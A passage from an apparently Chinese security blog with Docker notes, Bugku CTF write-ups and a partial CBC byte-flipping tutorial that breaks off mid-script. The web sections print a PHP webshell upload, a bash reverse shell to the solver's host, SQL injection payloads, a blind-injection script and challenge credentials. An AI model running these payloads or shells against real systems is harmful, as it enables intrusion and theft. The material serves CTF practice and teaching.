--no-trunc=false //以非截断方式显示镜像信息，默认关闭 -q,--quiet=false 1docker images centos 返回docker中对应的centos镜像 查看镜像 12docker inspect [OPTIONS] CONTAINER|IMAGE [CONTAINER|IMAGE...] -f,--format=&quot;&quot; 删除镜像 123docker rmi [OPTIONS] IMAGE -f,--force=false //强制删除 --no-prune=false //保留镜像中未打标签的父镜像 获取和查找镜像查找镜像 Docker Hub 在官方网站上进行搜索 docker search [OPTIOINS] TREM —automated=false Only show automated builds —no-trunc=false Don’t truncate output -s,—stars=0 Only displays with at least stars EXAMPLE: 1docker search ubuntu 获取和推送镜像拉取镜像 12docker pull [OPTIONS] NAME [:TAG] -a,--all-tags=false Download all tagged images in the respository EXP: 1docker pull ubuntu:14.04 这个命令拉取镜像的速度不是非常可观，这是因为站点在国外的原因，可以通过设置国内镜像源来提高下载速度 在 daocloud 上注册账户，点击加速器，复制命令在自己的主机上执行即可发现再拉取镜像是速度明显提高 推送镜像 1docker push NAME[:TAG] 构建镜像构建镜像可以帮我们保存对容器的修改，方便再次使用；同时也可以自定义镜像，还可以以软件的形式打包并分发服务及运行环境 使用commit来构建镜像创建一个镜像 1docker run -it -p 80 --name commit_test ubuntu /bin/bash 提交镜像 1docker commit -a &apos;charles&apos; -m &apos;nginx&apos; 仓库名 使用dockerfile创建镜像自行百度，略 Docker守护进程的配置与操作查看守护进程12ps -ef|grep dockersudo status docker Docker守护进程的停止开始1sudo service docker stop|start|restart Docker配置被修改后需要重启才能够生效 Docker的启动配置文件(配置docker的启动信息)文件位置 /etc/default/docker 利用该文件可以修改docker的各种启动配置信息 Docker的远程访问环境准备 第二台安装docker的服务器修改docker守护进程的启动选项以区别服务器保证client API与server API版本一致 Dcoker的容器卷管理 直接指定文件 1docker run -it -v ~/datavolume:[ro]/data[:ro] ubuntu /bin/bash /datavolumn指定源文件位置如果文件不存在则会自动创建，/data指定docker文件中的文件位置，[ro]指定文件访问权限 创建dockerfile Docker容器互联分别演示三部分 允许所有容器互联(默认)；拒绝容器间互联；允许特定容器间的连接","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/资料/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://chaosec.top/tags/docker/"}]},{"title":"bugku-writeup续","slug":"bugku-writeup续","date":"2018-04-03T14:33:55.000Z","updated":"2019-01-30T11:44:01.070Z","comments":true,"path":"2018/04/03/bugku-writeup续/","link":"","permalink":"http://chaosec.top/2018/04/03/bugku-writeup续/","excerpt":"杂项账号被盗了","text":"杂项账号被盗了 先修改浏览器cookie获取，之后可以获得一个可执行文件，是cf的一个刷枪客户端，wireshark抓取一下这个客户端的访问包，可以得到 AUTH LOGIN334 VXNlcm5hbWU6YmtjdGZ0ZXN0QDE2My5jb20=334 UGFzc3dvcmQ6YTEyMzQ1Ng== 这些base64是用户名和密码，登录邮箱即可获得flag，由于邮箱的flag已经被删除了，所以这里附上flag 1flag&#123;182100518+725593795416&#125; 爆照(08067CTF)binwalk一下发现图面里面隐藏了很多东西，分解一下，得到很多没有后缀名的文件，这题比较坑的地方就是我不知道这些文件都是可以打开的图片，文件88里面包含了一个二维码，扫描一下即可，得到第一段；888文件修改一下后缀名为jpg即可查看一个备注信息是一段base64编码，解码得到第二段值；8888里面隐藏了一张二维码，分解扫码即可得到第三段，拼接即可得到flag 妹子的陌陌上来先binwalk一下看一下，发现还包含一个RAR文件，解压文件发现有密码，查看图片发现图片上有 喜欢我吗. 字样，猜测这就是密码，解压成功后得到一段文本，有一段摩斯密码，解密一下发现是一个解密网站，文本又提示是aes解密，利用题目的密钥解密即可得到一个新的图片地址，访问该图片发现是一个二维码，但是黑白反相了，用PS处理一下（图像-&gt;调整-&gt;反相） 听首音乐音频隐写题目，用Audacity打开可以看到第一行，放大后发现像是摩斯密码，依次写出来解密一下即可，但是注意一定要是大写，小写不行。 好多数值这些数值是像素点，我们要做到就是把它们重新合成图像，根据像素点个数能够求出可能的图像的规格。 1234567891011121314151617from PIL import Image# 可能的图片大小# (1006 , 61)# (503 , 122)# (122 , 503)with open('1.txt','r') as file: x = 503 y = 122 im = Image.new('RGB',(x,y)) for i in range(x): for j in range(y): line = file.readline() rgb = line.split(',') im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))im.show() convert题目给出了一堆二进制数，照常先转为16进制，发现前六位是 526172，查找资料可知这是RAR文件的文件头，所以导出RAR文件，解压查看图片属性即可看到一段base64，解码即可得到flag 1234567891011s = '''0101001001100001011100100010000100011010000001110000000011001111100100000111001100000000000000000000110100000000000000000000'''# 这里输入二进制全文，这里只有删除了大部分的内容b = hex(int(s,2))a = '52172211a0700cf907300000d00000000000000f7c07420902c000d09000059220000023e6370190a59b34a1d330700200000006b65792e6a70670'# 16进制全文，注意删除前面的0x字段with open('1.rar','wb') as file: file.write(a.decode('hex')) 好多压缩包下载之后是一堆压缩包，发现都有密码，打开之后看到有crc校验值，应该就是CRC32碰撞 123456789101112131415161718192021222324252627#coding:utf-8import zipfileimport stringimport binasciidef CrackCrc(crc): for i in dic: for j in dic: for p in dic: for q in dic: s = i + j + p + q if crc == (binascii.crc32(s) &amp; 0xffffffff): f.write(s) returndef CrackZip(): for I in range(68): file = '123/out' + str(I) + '.zip' f = zipfile.ZipFile(file, 'r') GetCrc = f.getinfo('data.txt') crc = GetCrc.CRC CrackCrc(crc)dic = string.ascii_letters + string.digits + '+/='f = open('out.txt', 'w')CrackZip()f.close() 打开之后可以看到是一段base64，解码之后虽然部分是乱码，但是还可可以看到部分内容 fix the file and get the flag ，意思就是让我们修复这个文件，把解码后的内容导入到文件中，查看一下十六进制发现结尾是rar的文件尾部，推测这是RAR文件，则把文件头补齐一下，解压之后还是没有flag，于是再次查看压缩包，在注释里面找到了flag，（文件十六进制值里面有一个CMT字段，说明RAR文件存在注释） 一个普通的压缩包(xp0intCTF)文件下载之后是个RAR文件，解压之后是个flag.txt，但是里面内容没有flag，所以重点应该还是在这个压缩包，网上看了别人的思路是修改了文件的十六进制值部分改为 A8 3C 74 ，这样再次进行解压即可解压出一个png图片，但是查看十六进制值发现前缀是GIF前缀，修改后缀为GIF，在ps中有两个图层，再把这两个图层分别保存为gif文件，之后再用stegsolve查看即可看到二维码，分别保存，再在ps中上下拼接成二维码，坑点在于拼接之后的二维码还需要修复一下：将下面的图片下面的左半部分拼接左上角，另外还要讲左半部分的定位快在拼接到右上角的空块中。 就五层你能解开吗根据提示第一层是crc32碰撞，可以看到压缩包的3个txt文件都是6字节，所以猜测应该是用这三个TXT文件的crc32校验值来做。用github上的一个项目来做一下 1python crc32.py reverse 0x4dad5967 得到 4 bytes: {0x1b, 0xd6, 0x38, 0xc2}verification checksum: 0x4dad5967 (OK)alternative: 9rNYn3 (OK)alternative: Ay8sZC (OK)alternative: QHSaFX (OK)alternative: TmQA5n (OK)alternative: VQT_ls (OK)alternative: X28BT9 (OK)alternative: _GLQzV (OK)alternative: goMEPt (OK)alternative: nyUKFQ (OK)alternative: t_s4f3 (OK)alternative: xQxVkx (OK)alternative: yQ9gpa (OK) 把三个校验码都跑一下，然后提取其中相对有意义的结果拼起来可以得到解压密码 _CRC32_i5_n0t_s4f3 ，第一层解开！ 第二层是维吉尼亚密码，题目给出了近一万条密钥，直接暴力破解肯定是不可能的，但是我们发现密文第一个单词为 rla 只有三个字母，我们可以推测这三个字母的含义，我想了几个可能的情况 明文 密文 密钥 the rla yew she rla zee you rla txq key rla hhc 查表发现只有第一个可以找到对应密钥，尝试解密一下 the vigenere cipher is a method of encrypting alphabetic text by using a series of different caesar ciphers based on the letters of a keyword it is a simple form of polyalphabetic substitution so password is vigenere cipher funny 语义通顺，应该就是这个，用密钥尝试解压缩包，成功，第二层解开！ 第三次sha1碰撞，继续上脚本 123456789101112131415161718import stringimport hashlibkeys = string.ascii_letters + string.digits + string.punctuationdef sha1(s): sha1_hash = hashlib.sha1() sha1_hash.update(s) return sha1_hash.hexdigest()for i in keys: for j in keys: for p in keys: for q in keys: password = i + '7' + j + '5-' + p + '4' + q + '3?' sha = sha1(password.encode('utf-8')) if sha[0:7] == '619c20c' and sha[8] == 'a' and sha[16] == '9': print(password) 得到密码 I7~5-s4F3? ，第三次解开！ 第四层要求两个exe文件md5值相同但是输出不同，网上查找了一下还真的是有，一个文件输出 Hello World ;-) ,另一个输出 Goodbye World :-( ，以此为密码即可解开 第五层折腾了好久，RSA题目做的太少了，用openssl打开ssl文件看一下 1openssl rsa -pubin -in rsa_public_key.pem -text -modulus 可以看到e很大，也就是指数很大，网上找了一下有个wienerattack攻击，用脚本跑一下可以得到d 8264667972294275017293339772371783322168822149471976834221082393409363691895 那么接下来就是生成私钥了，github上有个ctftool可以生成私钥 1python rsatool.py -f PEM -o key.pem -n 46065780722597 -d 826466 -e 3546 PS：篇幅所限，数字我都缩小了 然后利用生成的私钥解密 1openssl rsautl -decrypt -in flag.enc -inkey key.pem -out 1.txt 然后即可得到flag。 web文件上传2这个题目有点难，找了半天的资料，刚开始什么也没有，查看元素发现有个 upload.php，打开发现只能上传图片，试了各种方法都没有用，最后百度了一下找到了方法，直接上传jpg文件，内容如下: 1&lt;script language=&quot;php&quot;&gt; system($_REQUEST[a])&lt;/script&gt; 发现成功上传，传递参数1?file=upload/201803160110346459.jpg&amp;a=ls 有个txt文件，查看一下1?file=upload/201803160110346459.jpg&amp;a=cat this_is_th3_F14g_154f65sd4g35f4d6f43.txt 如此可得到flag flag.php点了确实没反应，看了提示是 hint，原来是要get一个hint参数为1， ?hint=1，即可得到源代码，审计一下，只要使cookie中的ISecer的反序列化值与$EKY的反序列化全等即可。但要注意的是$KEY在序列化之前，即$KEY=’’，序列化为 s:0:”” 报错注入题目主要过滤了空格，可以用 /**/绕过，这里介绍个 load_file(filename)可以查看文件，然后慢慢截取即可 1id=1/**/and/**/updatexml(1,concat(0x7e,(concat(substr(load_file(0x2F7661722F746573742F6B65795F312E706870),100,30))),0x7e),1) 但是有一个地方贼坑，就是提交flag时的引号，一定要用题目里面要求的引号，不是英文的引号！！！ sql注入2发现文件泄露，访问flag即可(贼几把坑) 文件上传2(湖湘杯)这道题目没做出来，每次做文件上传类题目的时候总是没思路，这次看了别人的思路，直接文件读取居然就可以了。 1http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=flag 孙xx的博客扫描旁站发现一个PHPmyadmin，查看博客内容 MySQL数据库用户名define(‘DB_USER’, ‘wp’); MySQL数据库密码define(‘DB_PASSWORD’, ‘wzTrzYRdbrbyjAx’); 登录即可找到flag login(SKCTF)题目提示是SQL布尔盲注，username字段过滤了空格等常用字符，还有逻辑符号等，新学到一个mid()函数，可以绕过for和逗号 1username=admin&apos;^(ascii(mid((password)from(1)))&lt;&gt;55)^0#&amp;password=123 直接上脚本即可 123456789101112131415161718192021import requestsurl = \"http://118.89.219.210:49167/\"payload = ''data = &#123;'username':payload,'password':'123'&#125;flag_yes = 'error'flag = ''start = 1end_signal = Truewhile(end_signal): end_signal = False for j in range(33,127): payload = \"admin'^(ascii(mid((password)from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#\".format(str(start),str(j)) data['username'] = payload res = requests.post(url,data=data).text if flag_yes in res: flag += chr(j) print(flag) start += 1 end_signal = True break 注意：解出后的密码要md5解密，怪我太年轻。 PHP_encrypt_1(ISCCCTF)这个题目应该是有漏掉东西，没有给出加密后的密文，网上找一下密文，反向破解即可，贴上代码1234567891011121314151617181920212223242526272829303132333435363738394041# python3import base64import hashlibcipher = 'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=' # 题目中应该给出的密文串plain = base64.b64decode(cipher)plain = plain.decode('unicode-escape')plain1 = ''# 构造题目中的md5串m = hashlib.md5()m.update(b'ISCC')key = m.hexdigest()char = ''x = 0for i in range(len(cipher)): if x == len(key): x = 0 char += key[x] x += 1numflag = [] # 明文ascii码值def Is_OK(number): if number &gt;= 33 and number &lt; 127: return True else: return Falsefor i in range(len(plain)): for j in range(2): tmp = 128 * j + ord(plain[i]) - ord(char[i]) if Is_OK(tmp): numflag.append(tmp) break continuefor i in numflag: print(chr(i),end=\"\") login2(SKCTF)这题纯学习姿势，先正常发送请求，抓包发现提示是 tips，base64解码，是一段php代码12$sql=\"SELECT username,password FROM admin WHERE username='\".$username.\"'\";if (!empty($row) &amp;&amp; $row['password']===md5($password))&#123;&#125; 题目也提示了union绕过，payload 1username=1&apos; union select md5(1),md5(1)#&amp;password=1 如此即可绕过，登录后是个命令执行，接下来开始重要姿势！！！！ 反弹shell 你的linux主机上监听一下端口 1nc -lvv 8888 然后执行命令 1|bash -i &gt;&amp; /dev/tcp/你的ip地址/8888 0&gt;&amp;1 如此即可成功反弹到shell!!!!(233333) 然后读文件即可 代码审计md5加密相等绕过payload1?a=240610708 ereg正则%00截断好坑啊，提交了一个 ?password=9e9%00-老是不对，没想到居然是 ?password=9e9%00*-*,哎，扎心了… extract变量覆盖比较简单，payload12?shiyan=flag&amp;flag=php://inputflag 第二行以post方式提交 urldecode二次编码饶过题目关键点在于，$_GET[]会先对得到的参数进行一次url解码，然后在函数中又进行了一次解码，所以会产生二次编码漏洞。1?id=%2568%2561%2563%256B%2565%2572%2544%254A 二次编码后提交即可。 md5函数直接提交数组即可 sha函数比较绕过还是提交数组即可 十六进制与数字比较直接提交16进制数字即可。 strpos数组绕过还是数字绕过 ?ctf[]=1234 杂项眼见非实(ISCCCTF)看到文件名是个zip，改后缀名为zip打开，解压后发现是个doc文件，但是带不开，看一下16进制发现 504b0304的开头，所以应该是一个zip文件，在改后缀为zip解压，找出flag即可。 又一张图片，还单纯吗binwalk跑一下发现有两个图片，切一下即可1falg&#123;NSCTF_e6532a34928a3d1dadd0b049d5a3cc57&#125; 宽带信息泄露百度可知bin后缀为路由器备份文件，有routepassview打开找username字段即可。 隐写2binwalk跑一下即可，之后得到一个压缩包，需要密码，但是密码只有三位数，暴力破解即可密码871，然后16进制打开，在末尾即可得到flag，花括号内还要base64解码，注意吧flag的@换成a，这是一个坑。 linux直接解压，然后有个flag文件，hex里面找一下key即可。 中国菜刀下载后是个数据流文件，wireshark查看一下，由于是菜刀连接，所以只需要查看http协议即可，在第四个http协议里面发现了一句话木马，所以猜测数据传输应该在这之后，追踪一下http流，发现一段base64代码，解之12345678910@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION&lt;'5.3.0')&#123; @set_magic_quotes_runtime0);&#125;;echo(\"X@Y\");$F='C:\\\\wwwroot\\\\3.php';$P=@fopen($F,'r');echo(@fread($P,filesize($F)));@fclose($P);;echo(\"X@Y\");die(); 这应该是打开某个文件，开头和末尾都是 X@Y,查看下一个http流 这应该就是传输的文件，查看一下分组字节，然后把前后的X@Y去掉，解码为压缩形式即可得到flag 这么多数据包这个题不是很理解，数据流审计还很菜，这里记录一下别人的解法，观察tcp可以看出从104个包开始攻击机开始扫描目标机，在以5542开始的包就已经getshell，所以追踪一下tcp流，发现有个txt文件，有一段base64，解码即可得到flag、 隐写3改变图片高度即可 想蹭网先解开密码这个题不是很理解工具怎么使用，WiFi不是很了解，写一个字典出来，工具跑一下，命令如下 1aircrack-ng wifi.cap -w passwd.txt linux2下载文件，先是binwalk了一下，发现一个图片，还有一个图片，图片是一个flag内容，然而并不对，看了比人的wp才知道了正解，没必要binwalk直接跑一下命令即可 1strings brave &gt; a.txt 然后在a.txt中搜索一下 key，直接出现了flag 账号被盗了这题不会… 聪明的大象解压图片发现备注栏有一段base64，再看图片大小6M多，应该是加了东西，binwalk跑一下，切出来一个解压包，密码就是刚刚的base64，解之是一张图片，是以前的一道题，改变高度即可得到flag web进阶实战2-注入打开后发现news页面有id参数，加引号可以报错注入1?id=18 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 21,1),0x7e),1) Trim的日记本扫描目录，发现有一个 show.php进入即可得到flag！！！！不过不知道是不是正解。 社工社工进阶百度搜索孤长离发现有个贴吧，里面有个邮箱，尝试弱口令登录，百度top100弱口令，第二个就是了 a123456 信息查找直接百度 bugku.cn 今日头条，第一个结果的群号即可。 简单个人信息收集首先下载到一个压缩包，发现是伪加密，破解之，然后在上社工库查询一下即可。 简单的社工尝试google识图，然后有一个github相关的页面，点进去之后有一个微博链接，进去之后有个图片，打开图片中的链接即可。 加密简单加密凯撒移位，代码 123456789cipher = 'e6Z9i~]8R~U~QHE&#123;RnY&#123;QXg~QnQ&#123;^XVlRXlp^XI5Q6Q6SKY8jUAA'for i in range(-70,32): for j in cipher: # print(ord(j)+i) if (ord(j)+i) &gt; 132 or (ord(j)+i) &lt; 33: break print(chr(ord(j)+i),end=\"\") print('\\n') 一段base64多层解码，贴上代码: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import base64import reimport stringfrom urllib import parsewith open('base64.txt') as file: # base64解码 text = file.read() text = base64.b64decode(text) text = text.decode('utf-8') alp = re.findall(r'([0-7]+)',text) # base64解码后发现像8进制，8进制转换成10进制 new_alp = [] for item in alp: new_alp.append(int(item,8)) # ascii解码 alp = '' for i in new_alp: alp += str(chr(i)) # 前面的解码后为'\\xdd'的形式，推测为16进制 plain = '' cipher = re.findall(r'\\\\x([0-9a-f]+)',alp) for i in cipher: plain += str(chr(int(i,16))) # unicode解码 cipher2 = bytes(plain,encoding='utf-8') plain2 = cipher2.decode('unicode-escape') # ascii解码 cipher3 = re.findall(r'[0-9]&#123;2,&#125;',plain2) plain3 = '' for i in cipher3: plain3 += chr(int(i)) # unicode解码 cipher4 = re.findall(r'#x([0-9a-f]+)',plain3) plain4 = [] for i in cipher4: plain4.append(int(i,16)) # ascii解码 cipher5 = plain4 plain5 = '' for i in cipher5: plain5 += chr(i) # unicode cipher6 = re.findall(r'&amp;#([0-9]&#123;2,&#125;)',plain5) plain6 = '' for i in cipher6: plain6 += chr(int(i)) # urldecode print(parse.unquote(plain6)) ‘!?看了别人的wp，这题还是Ook!语言跑一下 +[]-brainfuck语言跑一下 奇怪的密码其实就是把flag的每一位的ascii值一次加1,2,3,..反过来解一下就可以了 12345678910cipher = 'gndk€rlqhmtkwwp&#125;z'plain = ''seq = 1for i in cipher: if i == '€': # 该字符为非法字符，不去掉的话可能会报错 seq += 1 continue plain += chr((ord(i) - seq)) seq += 1print(plain) 托马斯杰斐逊根据提示可知是杰斐逊圆盘加密，附上解密脚本 123456789101112131415161718192021222324252627282930313233tomas = '''ZWAXJGDLUBVIQHKYPNTCRMOSFEKPBELNACZDTRXMJQOYHGVSFUWIBDMAIZVRNSJUWFHTEQGYXPLOCKRPLNDVHGFCUKTEBSXQYIZMJWAOIHFRLABEUOTSGJVDKCPMNZQWXYAMKGHIWPNYCJBFZDRUSLOQXVETGWTHSPYBXIZULVKMRAFDCEONJQNOZUTWDCVRJLXKISEFAPMYGHBQQWATDSRFHENYVUBMCOIKZGJXPLWABMCXPLTDSRJQZGOIKFHENYVUXPLTDAOIKFZGHENYSRUBMCQWVJTDSWAYXPLVUBOIKZGJRFHENMCQBMCSRFHLTDENQWAOXPYVUIKZGJXPHKZGJTDSENYVUBMLAOIRFCQW'''new_tomas = []tmp = ''for i in range(len(tomas)): if tomas[i] == '\\n': new_tomas.append(tmp) tmp = '' else: tmp += tomas[i]key = [2,5,1,3,6,4,9,7,8,14,10,13,11,12]cipher = 'HCBTSXWCRQGLES'for index in range(len(cipher)): for p in range(26): if new_tomas[key[index]-1][p] == cipher[index]: new_tomas[key[index]-1] = new_tomas[key[index]-1][p:] + new_tomas[key[index]-1][:p] breakfor item in key: print(new_tomas[item-1][-6:]+new_tomas[item-1][:-6]) # 让输出更明显一点 输出如下 XMJQOYHGVSFUWIKPBELNACZDTRSGJVDKCPMNZQWXYIHFRLABEUOTXJGDLUBVIQHKYPNTCRMOSFEZWASJUWFHTEQGYXPLOCKBDMAIZVRNBFZDRUSLOQXVETAMKGHIWPNYCJUKTEBSXQYIZMJWAORPLNDVHGFCGJXPLQWATDSRFHENYVUBMCOIKZKMRAFDCEONJQGWTHSPYBXIZULVUTWDCVRJLXKISEFAPMYGHBQNOZAOIRFCQWXPHKZGJTDSENYVUBMLDSRJQZGOIKFHENYVUWABMCXPLTMCSRFHLTDENQWAOXPYVUIKZGJBIKFZGHENYSRUBMCQWVJXPLTDAONMCQTDSWAYXPLVUBOIKZGJRFHE 好像默认是按照第7位来当做密文，所以我特地按照这个格式来，那么第一列就是明文了，注意flag要求小写。 zip伪加密已经说了是zip伪加密，直接16进制修改一下即可 告诉你个秘密(ISCCCTF)看字符串像16进制，转成字符串可以看到像base64，再解码一次 1r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM 这是键盘对应的码 1TONGYUAN 注意本题没有说明flag的提交方式，应该是 flag:TONGYUAN 来自宇宙的信号既然说了是银河战队，直接百度搜 银河 文字，会看到第一个结果赫然是标准银河字母，对照一下就可以了。 至此，所有加密题目OK。","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"CBC字节翻转攻击","slug":"CBC-Attack","date":"2018-03-23T11:44:31.000Z","updated":"2019-02-16T08:25:30.686Z","comments":true,"path":"2018/03/23/CBC-Attack/","link":"","permalink":"http://chaosec.top/2018/03/23/CBC-Attack/","excerpt":"前言最近连着看了几篇CBC翻转攻击相关的文章，又正好遇到了这样的题目，所以来做一波看看一下。题目就是bugku上面的这道题目传送门。","text":"前言最近连着看了几篇CBC翻转攻击相关的文章，又正好遇到了这样的题目，所以来做一波看看一下。题目就是bugku上面的这道题目传送门。 原理CBC攻击方法的精髓在于通过损坏密文字节来改变明文字节，从而达到绕过过滤器或者提权等目的。贴一张图片 plaintext:待加密的数据 Ⅳ：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文 Ciphertext：加密后的数据 注意：CBC工作于一个固定长度的比特组，称之为块(BLOCK)，本文中将使用16字节的块。 加密过程： 1.首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。2.生成一个随机的初始化向量(IV)和一个密钥。3.将IV和第一组明文异或。4.用密钥对3中xor后产生的密文加密。5.用4中产生的密文对第二组明文进行xor操作。6.用密钥对5中产生的密文加密。7.重复4-7，到最后一组明文。8.将IV和加密后的密文拼接在一起，得到最终的密文。 从第一块开始，首先与一个初始向量iv异或（iv只在第一处作用），然后把异或的结果配合key进行加密，得到第一块的密文，并且把加密的结果与下一块的明文进行异或，一直这样进行下去。因此这种模式最重要的特点就是：前一块的密文用来产生后一块的密文。 解密过程： 解密过程就是加密过程的逆过程 1.从密文中提取出IV，然后将密文分组。2.使用密钥对第一组的密文解密，然后和IV进行xor得到明文。3.使用密钥对第二组密文解密，然后和2中的密文xor得到明文。4.重复2-3，直到最后一组密文。 攻击原理图 这里可以注意到前一块Ciphertext用来产生下一块明文，如果我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。 介绍一下异或的概念 当我们的一个值C是由A和B异或得到C = A XOR B那么A XOR B XOR C很明显是=0的当我们知道B和C之后，想要得到A的值也很容易A = B XOR C因此，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变。 上手题目存在目录泄露 .index.php.swp，会下载到一个源码，需要用vim恢复一下，使用下面的命令 1vi -r &#123;your file name&#125; 然后用下面的命令删除swp文件，不然每一次编辑时总是有这个提示。 1rm .&#123;your file name&#125;.swp 再输入7即可恢复代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;&lt;title&gt;Login Form&lt;/title&gt;&lt;link href=\"static/css/style.css\" rel=\"stylesheet\" type=\"text/css\" /&gt;&lt;script type=\"text/javascript\" src=\"static/js/jquery.min.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt;$(document).ready(function() &#123; $(\".username\").focus(function() &#123; $(\".user-icon\").css(\"left\",\"-48px\"); &#125;); $(\".username\").blur(function() &#123; $(\".user-icon\").css(\"left\",\"0px\"); &#125;); $(\".password\").focus(function() &#123; $(\".pass-icon\").css(\"left\",\"-48px\"); &#125;); $(\".password\").blur(function() &#123; $(\".pass-icon\").css(\"left\",\"0px\"); &#125;);&#125;);&lt;/script&gt;&lt;/head&gt;&lt;?phpdefine(\"SECRET_KEY\", file_get_contents('/root/key'));define(\"METHOD\", \"aes-128-cbc\");session_start();function get_random_iv()&#123; $random_iv=''; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie(\"iv\", base64_encode($iv)); setcookie(\"cipher\", base64_encode($cipher));&#125;function check_login()&#123; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE[\"iv\"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die(\"&lt;p&gt;base64_decode('\".base64_encode($plain).\"') can't unserialize&lt;/p&gt;\"); $_SESSION['username'] = $info['username']; &#125;else&#123; die(\"ERROR!\"); &#125; &#125;&#125;function show_homepage()&#123; if ($_SESSION[\"username\"]==='admin')&#123; echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; &#125;else&#123; echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; &#125; echo '&lt;p&gt;&lt;a href=\"loginout.php\"&gt;Log out&lt;/a&gt;&lt;/p&gt;';&#125;if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; if($username === 'admin')&#123; exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); &#125;else&#123; $info = array('username'=&gt;$username,'password'=&gt;$password); login($info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION[\"username\"]))&#123; check_login(); show_homepage(); &#125;else&#123; echo '&lt;body class=\"login-body\"&gt; &lt;div id=\"wrapper\"&gt; &lt;div class=\"user-icon\"&gt;&lt;/div&gt; &lt;div class=\"pass-icon\"&gt;&lt;/div&gt; &lt;form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\"&gt; &lt;div class=\"header\"&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class=\"content\"&gt; &lt;input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" /&gt; &lt;input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" /&gt; &lt;/div&gt; &lt;div class=\"footer\"&gt; &lt;input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; &#125;&#125;?&gt;t&lt;/html&gt; 一直也不行，心态崩了(2333333…) 一个星期之后….. 我胡汉三又回来了！！！！ 我们把返回的cipher值进行翻转，想要翻转第二块的 m为 a只需要把第一行对应第九位翻转一下即可，代码如下 123456789101112131415161718192021222324import urllib.parseimport requestsimport base64iv = 'sDGucEcgR9ixzDNVm6IrpA%3D%3D'cipher_raw = 'xhp6%2B1A%2FKctfyU%2BbQeuRx3lUMrDUN%2FOuXg96c%2FJ%2Byn5DX2UVNMavsdocAGjmu6SmuRD6kY8Ef4rLKYADlEeUjQ%3D%3D'print(\"[*]原始iv和cipher\")print('翻转前：')print('cipher_raw:',cipher_raw)print('iv_raw:',iv)print('翻转后：')tmp1 = urllib.parse.unquote(cipher_raw)cipher = base64.b64decode(tmp1)# a:2:&#123;s:8:\"userna# me\";s:5:\"mdmin\";# s:8:\"password\";s# :6:\"123456\";&#125;cipher = cipher.decode('unicode_escape')xor_cipher = cipher[0:9] + chr(ord(cipher[9]) ^ ord('m') ^ ord('a')) + cipher[10:]xor_cipher = urllib.parse.quote(base64.b64encode(xor_cipher.encode('latin-1')))print(xor_cipher) 写完这个脚本，我心中又不禁对python的编码问题骂了无数次mmp，真的太多坑了….. 然后修改cookie中的cipher值，刷新页面（注意此时不能提交数据,要把post数据清空）之后，页面会提示反序列化失败，这是因为我们修改mdmin为admin的时候，是通过修改第一块数据来修改的，所以第一个块数据（16字节）被破坏了。因为程序中要求username要等于admin所以不能利用文章里的说的填充字符。 又因为是第一个块数据被破坏，第一个块数据是和IV有关，所以只要将在CBC字符翻转攻击，得到新的IV就可以修复第一块数据。 贴一下代码 123456789101112# 得到新的iv值iv = 'sDGucEcgR9ixzDNVm6IrpA%3D%3D' # 填写未修改过的ivcipher = 'SjeC+xtTva24pYSPdWXIsm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9' # 填写提示反序列化错误的字符串cipher = base64.b64decode(cipher).decode('unicode_escape')print('cipher:',cipher)iv = base64.b64decode(urllib.parse.unquote(iv))iv = 